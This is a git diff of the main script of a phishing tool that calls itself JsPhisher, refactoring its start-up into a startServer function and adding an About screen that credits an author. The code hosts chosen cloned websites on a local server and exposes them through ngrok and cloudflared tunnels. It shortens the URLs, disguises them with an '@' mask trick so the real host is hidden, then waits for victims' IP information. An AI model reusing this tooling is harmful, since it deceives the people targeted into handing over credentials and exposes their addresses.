@@ -137,45 +137,9 @@ app.disable("x-powered-by");
 (async () => {
 	await controlVersion().catch(throwError);
 	await installRequirements().catch(throwError);
+	process.on("SIGINT", _ => onExit());
 	siteConfig = (await selectSite().catch(throwError)).config;
-	console.clear();
-	console.log(logLogo);
-	console.log(chalk.magenta`${logInfo2} Selected {bold ${siteConfig.name}}\n`);
-	if (isTermux) {
-		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
-		await new Promise(r => setTimeout(r, 1000));
-	}
-	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
-	await new Promise(r => {
-		try {
-			app.listen(port, _ => {
-				console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
-				r();
-			});
-		} catch (e) {
-			throwError(e);
-		}
-	});
-	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
-	const ngrok = await openNgrok(port).catch(throwError);
-	const shortNgrok = await short(ngrok).catch(throwError);
-	const cloudflared = !isTermux ? await openCloudflared(port).catch(throwError) : null;
-	const shortCf = !isTermux ? await short(cloudflared).catch(throwError) : null;
-	if (!isTermux) {
-		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
-		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
-	}
-	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
-	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
-	if (process.platform === "win32") {
-		require("readline")
-			.createInterface({ input: process.stdin, output: process.stdout })
-			.on("SIGINT", () => process.emit("SIGINT"));
-	}
-	process.on("SIGINT", onExit);
+	startServer();
 })();
 
 app.all("/", async (req, res) => {
@@ -410,10 +374,13 @@ function selectSite() {
 			spacing = ((index + 1) / 3) % 1 === 0 ? "\n" : spacing;
 			process.stdout.write(chalk.yellowBright`{greenBright [}{whiteBright ${index + 1 < 10 ? "0" + (index + 1) : index + 1}}{greenBright ]} ${site}${spacing}`);
 		});
-		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
+		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright X}{greenBright ]} About                  {greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
 		const choose = readlineSync.prompt({ prompt: chalk.yellowBright`${logAsk} Select one of the options > ` });
 		if (choose == "0") {
 			onExit(true);
+		} else if (choose === "X" || choose === "x") {
+			scriptAbout();
+			return;
 		} else if (!choose || isNaN(parseInt(choose)) || Object.keys(availableSites).length < parseInt(choose) || parseInt(choose) < 0) {
 			console.clear();
 			console.log(chalk.redBright`${logError} Invalid input.`);
@@ -457,4 +424,63 @@ function downloadSites(folder) {
 		}
 		resolve(JSON.parse(fs.readFileSync(path.join(__dirname, "bin", "websites", folder, "config.json"), "utf8")));
 	});
+}
+
+async function scriptAbout() {
+	console.clear();
+	console.log(logLogo);
+	console.log(chalk.redBright`[ToolName]  {cyanBright :[JsPhisher]} `);
+	console.log(chalk.redBright`[Version]   {cyanBright :[${VERSION}]}`);
+	console.log(chalk.redBright`[Author]    {cyanBright :[GamerboyTR] }`);
+	console.log(chalk.redBright`[Github]    {cyanBright :[https://github.com/gamerboytr] }`);
+	console.log(chalk.redBright`[Discord]   {cyanBright :[https://discord.gg/turkishmethods] }`);
+	console.log(chalk.redBright`[Email]     {cyanBright :[offical.gamerboytr@yandex.com]}\n`);
+	console.log(chalk.yellowBright`{greenBright [}{whiteBright 0}{greenBright ]} Exit                     {greenBright [}{whiteBright 99}{greenBright ]}  Main Menu       `);
+	const choose = readlineSync.prompt({ prompt: "\n > " });
+	if (choose == "0") {
+		onExit(true);
+	} else if (choose == "99") {
+		console.clear();
+		console.log(logLogo);
+		siteConfig = (await selectSite().catch(throwError)).config;
+		startServer();
+	} else {
+		console.log(chalk.redBright`${logError} Invalid input.`);
+		scriptAbout();
+	}
+}
+
+async function startServer() {
+	console.clear();
+	console.log(logLogo);
+	console.log(chalk.magenta`${logInfo2} Selected {bold ${siteConfig.name}}\n`);
+	if (isTermux) {
+		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
+		await new Promise(r => setTimeout(r, 1000));
+	}
+	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
+	await new Promise(r => {
+		try {
+			app.listen(port, _ => {
+				console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
+				r();
+			});
+		} catch (e) {
+			throwError(e);
+		}
+	});
+	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
+	const ngrok = await openNgrok(port).catch(throwError);
+	const shortNgrok = await short(ngrok).catch(throwError);
+	const cloudflared = !isTermux ? await openCloudflared(port).catch(throwError) : null;
+	const shortCf = !isTermux ? await short(cloudflared).catch(throwError) : null;
+	if (!isTermux) {
+		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
+		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
+		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
+	}
+	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
+	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
 }
